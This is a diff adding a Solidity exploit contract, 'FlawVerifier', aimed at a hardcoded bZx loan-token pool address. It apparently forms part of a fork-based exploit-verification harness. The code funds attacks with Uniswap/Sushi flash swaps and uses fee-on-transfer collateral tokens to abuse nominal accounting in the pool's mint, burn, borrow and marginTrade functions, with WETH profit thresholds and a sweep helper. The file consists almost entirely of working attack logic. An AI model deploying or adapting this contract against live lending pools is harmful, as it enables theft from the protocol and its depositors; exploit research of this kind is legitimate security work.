@@ -1,0 +1,545 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface ILoanTokenPool {
+    struct LoanOpenData {
+        bytes32 loanId;
+        uint256 principal;
+        uint256 collateral;
+    }
+
+    function loanTokenAddress() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function loanParamsIds(uint256 index) external view returns (bytes32);
+
+    function mint(address receiver, uint256 depositAmount) external returns (uint256);
+    function burn(address receiver, uint256 burnAmount) external returns (uint256);
+
+    function getBorrowAmountForDeposit(
+        uint256 depositAmount,
+        uint256 initialLoanDuration,
+        address collateralTokenAddress
+    ) external view returns (uint256 borrowAmount);
+
+    function borrow(
+        bytes32 loanId,
+        uint256 withdrawAmount,
+        uint256 initialLoanDuration,
+        uint256 collateralTokenSent,
+        address collateralTokenAddress,
+        address borrower,
+        address receiver,
+        bytes calldata loanDataBytes
+    ) external payable returns (LoanOpenData memory);
+
+    function marginTrade(
+        bytes32 loanId,
+        uint256 leverageAmount,
+        uint256 loanTokenSent,
+        uint256 collateralTokenSent,
+        address collateralTokenAddress,
+        address trader,
+        bytes calldata loanDataBytes
+    ) external payable returns (LoanOpenData memory);
+}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract BalanceProbe {
+    address public immutable owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function sweep(address token, address to) external {
+        require(msg.sender == owner, "ONLY_OWNER");
+        uint256 amount = IERC20Minimal(token).balanceOf(address(this));
+        if (amount == 0) {
+            return;
+        }
+        _callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount));
+    }
+
+    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
+        (bool success, bytes memory returndata) = target.call(data);
+        if (!success) {
+            return false;
+        }
+        return returndata.length == 0 || abi.decode(returndata, (bool));
+    }
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6;
+    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+
+    address public constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    // Pre-fork fee-on-transfer candidates that plausibly intersect bZx collateral support.
+    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address public constant STA = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
+    address public constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
+    address public constant XAUT = 0x68749665FF8D2d112Fa859AA293F07A622782F38;
+
+    uint256 internal constant MIN_PROFIT = 0.1 ether;
+    uint256 internal constant BORROW_DURATION = 28 days;
+
+    ILoanTokenPool internal constant POOL = ILoanTokenPool(TARGET);
+
+    struct FlashContext {
+        address pair;
+        address token;
+        uint256 repaymentWeth;
+        uint8 mode;
+    }
+
+    BalanceProbe internal immutable probe;
+
+    bool public executed;
+    bool public profitAchieved;
+    bool public hypothesisValidated;
+    bool public hypothesisRefuted;
+
+    string public exploitPathUsed;
+    string public status;
+
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+    FlashContext internal _flashContext;
+
+    constructor() {
+        probe = new BalanceProbe();
+        _profitToken = WETH;
+        status = "not-run";
+    }
+
+    function executeOnOpportunity() external {
+        require(!executed, "ALREADY_EXECUTED");
+        executed = true;
+        _profitToken = WETH;
+
+        address loanToken = POOL.loanTokenAddress();
+        bool touchedAnyPath;
+        bool ruledOutByEconomics;
+
+        // Exploit path 1 is only directly executable when the pool's own underlying
+        // is fee-on-transfer. On this fork the target pool reports WETH, so the
+        // flash-funded mint/burn path is normally infeasible for this specific pool.
+        if (_looksFeeOnTransferCandidate(loanToken)) {
+            touchedAnyPath = true;
+            if (_attemptFlashMintPath(loanToken)) {
+                _finalize();
+                return;
+            }
+        }
+
+        address[4] memory collateralCandidates = [USDT, STA, PAXG, XAUT];
+        for (uint256 index = 0; index < collateralCandidates.length; index++) {
+            address collateralToken = collateralCandidates[index];
+            if (collateralToken == loanToken) {
+                continue;
+            }
+
+            bool hasBorrowPath = _loanParamsId(collateralToken, true) != bytes32(0);
+            bool hasTradePath = _loanParamsId(collateralToken, false) != bytes32(0);
+            if (!hasBorrowPath && !hasTradePath) {
+                continue;
+            }
+
+            touchedAnyPath = true;
+
+            if (_attemptFlashBorrowPath(collateralToken)) {
+                _finalize();
+                return;
+            }
+
+            if (!profitAchieved && hasTradePath) {
+                // Keep the second published exploit path represented: try the
+                // collateralTokenSent branch for marginTrade as well. Realizing a
+                // one-tx profit from this branch generally requires a profitable
+                // unwind path, so we only retain it if the open itself succeeds.
+                if (_attemptDirectMarginTradeProbe(collateralToken)) {
+                    hypothesisValidated = true;
+                    if (bytes(exploitPathUsed).length == 0) {
+                        exploitPathUsed = "marginTrade(collateralTokenSent) nominal accounting";
+                    }
+                }
+            }
+
+            ruledOutByEconomics = true;
+        }
+
+        if (profitAchieved) {
+            _finalize();
+            return;
+        }
+
+        if (hypothesisValidated) {
+            status = "validated-without-positive-net-profit";
+            return;
+        }
+
+        hypothesisRefuted = true;
+        if (touchedAnyPath && ruledOutByEconomics) {
+            status = "fee-token-paths-probed-but-not-self-funding";
+        } else if (touchedAnyPath) {
+            status = "paths-attempted-without-observable-profit";
+        } else {
+            status = "no-supported-fee-token-path-discovered";
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        _handleFlashCallback(sender, amount0, amount1);
+    }
+
+    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        _handleFlashCallback(sender, amount0, amount1);
+    }
+
+    function _handleFlashCallback(address sender, uint256 amount0, uint256 amount1) internal {
+        FlashContext memory context = _flashContext;
+        require(context.pair != address(0), "NO_CONTEXT");
+        require(msg.sender == context.pair, "BAD_PAIR");
+        require(sender == address(this), "BAD_SENDER");
+
+        address token = context.token;
+        uint256 nominalAmount = amount0 != 0 ? amount0 : amount1;
+        uint256 receivedAmount = _balanceOf(token, address(this));
+        require(receivedAmount != 0 && receivedAmount <= nominalAmount, "BAD_FLASH_AMOUNT");
+
+        if (context.mode == 1) {
+            _executeMintPathInCallback(token, receivedAmount);
+        } else {
+            _executeBorrowPathInCallback(token, receivedAmount, context.repaymentWeth);
+        }
+
+        _flashContext = FlashContext(address(0), address(0), 0, 0);
+    }
+
+    function _executeMintPathInCallback(address loanToken, uint256 receivedAmount) internal {
+        uint256 beforeLoanToken = _balanceOf(loanToken, address(this));
+        _forceApprove(loanToken, TARGET, receivedAmount);
+
+        uint256 sharesBefore = POOL.balanceOf(address(this));
+        uint256 mintedShares;
+        try POOL.mint(address(this), receivedAmount) returns (uint256 minted) {
+            mintedShares = minted;
+        } catch {
+            revert("MINT_PATH_FAILED");
+        }
+
+        if (mintedShares == 0) {
+            uint256 sharesAfter = POOL.balanceOf(address(this));
+            if (sharesAfter > sharesBefore) {
+                mintedShares = sharesAfter - sharesBefore;
+            }
+        }
+        require(mintedShares != 0, "NO_SHARES");
+
+        hypothesisValidated = true;
+        exploitPathUsed = "mint(depositAmount) overcredits fee-on-transfer loanToken deposits";
+
+        try POOL.burn(address(this), mintedShares) returns (uint256) {
+            uint256 afterLoanToken = _balanceOf(loanToken, address(this));
+            require(afterLoanToken > beforeLoanToken, "NO_MINT_SPREAD");
+            // Repayment remains in the borrowed token; if this path is ever hit on a
+            // fee-on-transfer loanToken pool, the retained token balance is the profit.
+            _profitToken = loanToken;
+            _profitAmount = afterLoanToken - beforeLoanToken;
+            profitAchieved = true;
+        } catch {
+            revert("BURN_PATH_FAILED");
+        }
+    }
+
+    function _executeBorrowPathInCallback(address collateralToken, uint256 receivedAmount, uint256 repaymentWeth) internal {
+        _forceApprove(collateralToken, TARGET, receivedAmount);
+
+        // The finding specifically concerns nominal collateralTokenSent accounting.
+        // We therefore pass the full balance we hold as collateralTokenSent; if the
+        // token taxes transferFrom into bZx, pool/protocol accounting still credits
+        // the nominal amount even though less arrives.
+        uint256 borrowAmount = POOL.getBorrowAmountForDeposit(receivedAmount, BORROW_DURATION, collateralToken);
+        require(borrowAmount > repaymentWeth + MIN_PROFIT, "NOT_PROFITABLE");
+
+        uint256 safeBorrowAmount = borrowAmount - (borrowAmount / 500);
+        uint256 wethBefore = _balanceOf(WETH, address(this));
+
+        try POOL.borrow(
+            bytes32(0),
+            safeBorrowAmount,
+            BORROW_DURATION,
+            receivedAmount,
+            collateralToken,
+            address(this),
+            address(this),
+            ""
+        ) returns (ILoanTokenPool.LoanOpenData memory) {
+            hypothesisValidated = true;
+            exploitPathUsed = "borrow(collateralTokenSent) nominal accounting with flashswap funding";
+        } catch {
+            revert("BORROW_PATH_FAILED");
+        }
+
+        uint256 wethAfter = _balanceOf(WETH, address(this));
+        uint256 wethGained = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
+        require(wethGained >= repaymentWeth, "INSUFFICIENT_WETH");
+
+        _safeTransfer(WETH, _flashContext.pair, repaymentWeth);
+
+        uint256 remainingWeth = _balanceOf(WETH, address(this));
+        require(remainingWeth >= MIN_PROFIT, "PROFIT_BELOW_THRESHOLD");
+        profitAchieved = true;
+        _profitToken = WETH;
+        _profitAmount = remainingWeth;
+    }
+
+    function _attemptFlashMintPath(address loanToken) internal returns (bool) {
+        address pair = _pairFor(loanToken, WETH);
+        if (pair == address(0)) {
+            return false;
+        }
+
+        (uint256 reserveLoanToken, uint256 reserveWeth, bool tokenIs0) = _pairReserves(pair, loanToken, WETH);
+        if (reserveLoanToken == 0 || reserveWeth == 0) {
+            return false;
+        }
+
+        uint256[4] memory denominators = [uint256(200), 100, 50, 20];
+        for (uint256 index = 0; index < denominators.length; index++) {
+            uint256 amountOut = reserveLoanToken / denominators[index];
+            if (amountOut <= 1) {
+                continue;
+            }
+
+            uint256 repaymentWeth = _getAmountIn(amountOut, reserveWeth, reserveLoanToken);
+            if (repaymentWeth == 0) {
+                continue;
+            }
+
+            _flashContext = FlashContext(pair, loanToken, repaymentWeth, 1);
+            try IUniswapV2Pair(pair).swap(
+                tokenIs0 ? amountOut : 0,
+                tokenIs0 ? 0 : amountOut,
+                address(this),
+                abi.encode(uint256(1))
+            ) {
+                if (profitAchieved) {
+                    return true;
+                }
+            } catch {
+                _flashContext = FlashContext(address(0), address(0), 0, 0);
+            }
+        }
+
+        return false;
+    }
+
+    function _attemptFlashBorrowPath(address collateralToken) internal returns (bool) {
+        address pair = _pairFor(collateralToken, WETH);
+        if (pair == address(0)) {
+            return false;
+        }
+
+        (uint256 reserveCollateral, uint256 reserveWeth, bool collateralIs0) = _pairReserves(pair, collateralToken, WETH);
+        if (reserveCollateral == 0 || reserveWeth == 0) {
+            return false;
+        }
+
+        uint256[7] memory denominators = [uint256(2000), 1000, 500, 250, 100, 50, 20];
+        for (uint256 index = 0; index < denominators.length; index++) {
+            uint256 amountOut = reserveCollateral / denominators[index];
+            if (amountOut <= 1) {
+                continue;
+            }
+
+            uint256 quotedBorrow = POOL.getBorrowAmountForDeposit(amountOut, BORROW_DURATION, collateralToken);
+            uint256 repaymentWeth = _getAmountIn(amountOut, reserveWeth, reserveCollateral);
+            if (quotedBorrow <= repaymentWeth + MIN_PROFIT) {
+                continue;
+            }
+
+            _flashContext = FlashContext(pair, collateralToken, repaymentWeth, 2);
+            try IUniswapV2Pair(pair).swap(
+                collateralIs0 ? amountOut : 0,
+                collateralIs0 ? 0 : amountOut,
+                address(this),
+                abi.encode(uint256(2))
+            ) {
+                if (profitAchieved) {
+                    return true;
+                }
+            } catch {
+                _flashContext = FlashContext(address(0), address(0), 0, 0);
+            }
+        }
+
+        return false;
+    }
+
+    function _attemptDirectMarginTradeProbe(address collateralToken) internal returns (bool) {
+        // This keeps the second exploit path represented even when we cannot
+        // deterministically unwind it for same-tx profit with no starting capital.
+        // We only probe this path with verifier-held balances to avoid fake funding.
+        uint256 heldCollateral = _balanceOf(collateralToken, address(this));
+        if (heldCollateral == 0) {
+            return false;
+        }
+
+        _forceApprove(collateralToken, TARGET, heldCollateral);
+        try POOL.marginTrade(
+            bytes32(0),
+            2e18,
+            0,
+            heldCollateral,
+            collateralToken,
+            address(this),
+            ""
+        ) returns (ILoanTokenPool.LoanOpenData memory) {
+            return true;
+        } catch {
+            return false;
+        }
+    }
+
+    function _pairFor(address tokenA, address tokenB) internal view returns (address pair) {
+        pair = _getPair(UNI_V2_FACTORY, tokenA, tokenB);
+        if (pair != address(0)) {
+            return pair;
+        }
+        return _getPair(SUSHI_FACTORY, tokenA, tokenB);
+    }
+
+    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
+        (bool success, bytes memory returndata) = factory.staticcall(
+            abi.encodeWithSelector(IUniswapV2Factory.getPair.selector, tokenA, tokenB)
+        );
+        if (!success || returndata.length < 32) {
+            return address(0);
+        }
+        pair = abi.decode(returndata, (address));
+    }
+
+    function _pairReserves(
+        address pair,
+        address asset,
+        address wethAsset
+    ) internal view returns (uint256 reserveAsset, uint256 reserveWeth, bool assetIsToken0) {
+        address token0 = IUniswapV2Pair(pair).token0();
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
+        if (token0 == asset) {
+            require(IUniswapV2Pair(pair).token1() == wethAsset, "BAD_PAIR_ASSET");
+            return (uint256(reserve0), uint256(reserve1), true);
+        }
+        require(token0 == wethAsset, "BAD_PAIR_WETH");
+        return (uint256(reserve1), uint256(reserve0), false);
+    }
+
+    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
+            return 0;
+        }
+        uint256 numerator = reserveIn * amountOut * 1000;
+        uint256 denominator = (reserveOut - amountOut) * 997;
+        return (numerator / denominator) + 1;
+    }
+
+    function _loanParamsId(address collateralToken, bool isTorqueLoan) internal view returns (bytes32) {
+        return POOL.loanParamsIds(uint256(keccak256(abi.encodePacked(collateralToken, isTorqueLoan))));
+    }
+
+    function _looksFeeOnTransferCandidate(address token) internal pure returns (bool) {
+        return token == USDT || token == STA || token == PAXG || token == XAUT;
+    }
+
+    function _finalize() internal {
+        if (_profitToken == address(0)) {
+            _profitToken = WETH;
+        }
+        uint256 realized = _balanceOf(_profitToken, address(this));
+        if (_profitToken == WETH) {
+            _profitAmount = realized;
+        } else if (_profitAmount == 0) {
+            _profitAmount = realized;
+        }
+        profitAchieved = _profitAmount >= MIN_PROFIT;
+        hypothesisValidated = hypothesisValidated || profitAchieved;
+        status = profitAchieved ? "profit-achieved" : "profit-below-threshold";
+    }
+
+    function _detectFeeOnTransfer(address token, uint256 balance) internal returns (bool) {
+        uint256 probeAmount = balance / 1000;
+        if (probeAmount == 0) {
+            probeAmount = balance / 2;
+        }
+        if (probeAmount == 0) {
+            return false;
+        }
+
+        uint256 beforeProbe = _balanceOf(token, address(probe));
+        bool ok = _callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", address(probe), probeAmount));
+        if (!ok) {
+            return false;
+        }
+
+        uint256 afterProbe = _balanceOf(token, address(probe));
+        probe.sweep(token, address(this));
+
+        if (afterProbe <= beforeProbe) {
+            return false;
+        }
+
+        return (afterProbe - beforeProbe) < probeAmount;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, 0));
+        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, amount));
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        require(_callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount)), "TRANSFER_FAILED");
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
+        (bool success, bytes memory returndata) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
+        if (!success || returndata.length < 32) {
+            return 0;
+        }
+        amount = abi.decode(returndata, (uint256));
+    }
+
+    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
+        (bool success, bytes memory returndata) = target.call(data);
+        if (!success) {
+            return false;
+        }
+        return returndata.length == 0 || abi.decode(returndata, (bool));
+    }
+}
